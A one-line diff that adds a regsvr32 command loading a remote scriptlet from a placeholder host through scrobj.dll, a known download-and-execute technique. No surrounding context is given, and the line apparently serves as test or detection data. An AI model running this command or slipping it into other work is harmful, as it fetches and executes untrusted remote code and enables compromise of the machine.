@@ -1,0 +1,1 @@
+regsvr32 /s /n /u /i:http://regsvr-5.example.test/e.sct scrobj.dll
